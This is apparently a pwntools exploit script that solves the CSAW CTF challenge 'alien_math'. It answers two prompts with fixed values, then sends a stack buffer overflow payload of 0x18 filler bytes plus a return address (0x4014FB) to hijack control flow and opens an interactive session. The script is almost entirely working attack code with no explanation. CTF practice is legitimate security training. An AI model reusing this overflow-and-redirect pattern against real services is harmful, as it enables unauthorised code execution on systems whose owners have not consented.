# -- coding: utf-8 --
from pwn import *

# ENV
PORT =  5004
HOST = "pwn.chal.csaw.io"
e = context.binary = ELF('./alien_math')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()
    pause()


# VARIABLE


# PAYLOAD
payload  = ''



r.sendlineafter('zopnol?', "1804289383")
r.sendlineafter(' qorbnorbf?', "785644589921306542879".ljust(23, '1'))

r.sendlineafter("ed salwzoblrs", 'a'*0x18 + p64(0x4014FB))



r.interactive()
